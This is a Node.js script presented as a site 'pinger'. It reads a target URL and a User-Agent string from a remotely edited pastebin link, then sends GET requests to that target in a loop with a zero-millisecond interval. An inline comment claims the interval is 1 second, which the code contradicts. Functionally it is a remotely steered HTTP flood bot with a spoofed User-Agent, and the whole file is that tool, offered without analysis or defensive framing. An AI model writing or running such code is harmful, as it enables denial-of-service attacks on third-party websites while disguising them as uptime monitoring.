const { exec } = require('child_process');

exec('npm install axios', (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Command execution failed: ${stderr}`);
    return;
  }
  console.log(`Package installed successfully.`);

  // Code execution after package installation
  startScript();
});

function startScript() {
  const axios = require('axios');

  const SITE_URL = 'YOUR_PASTEBIN_LINK';
  const PING_INTERVAL = 0; // 1 second in milliseconds
  const CHECK_INTERVAL = 5000; // 5 seconds in milliseconds;

  let siteToPing;
  let pingIntervalId;
  let useragent = '';

  async function getSiteUrl() {
    try {
      const response = await axios.get(SITE_URL);
      const data = response.data;

      if (data.site === 'N/A') {
        console.log('No site available. Stopping pinging.');
        clearInterval(pingIntervalId); // Stop pinging
        return;
      }

      const newSiteToPing = data.site;
      useragent = data.useragent;

      if (newSiteToPing !== siteToPing) {
        siteToPing = newSiteToPing;
        console.log(`Starting pinging site: ${siteToPing}`);
        startPinging();
      } else {
        console.log(`Site ${siteToPing} is the same as the last check. Skipping...`);
      }
    } catch (error) {
      console.error('Error occurred while fetching site URL:', error);
    }
  }

  async function pingSite() {
    try {
      await axios.get(siteToPing, {
        headers: {
          'User-Agent': useragent, // Set the User-Agent header from the response
        },
      });
      console.log(`Site ${siteToPing} is up!`);
    } catch (error) {
      console.log(`Site ${siteToPing} is down!`);
    }
  }

  function startPinging() {
    pingSite(); // Start the initial ping

    // Schedule subsequent pings
    pingIntervalId = setInterval(pingSite, PING_INTERVAL);
  }

  // Start the initial check
  getSiteUrl();

  // Schedule subsequent checks
  setInterval(getSiteUrl, CHECK_INTERVAL);
}
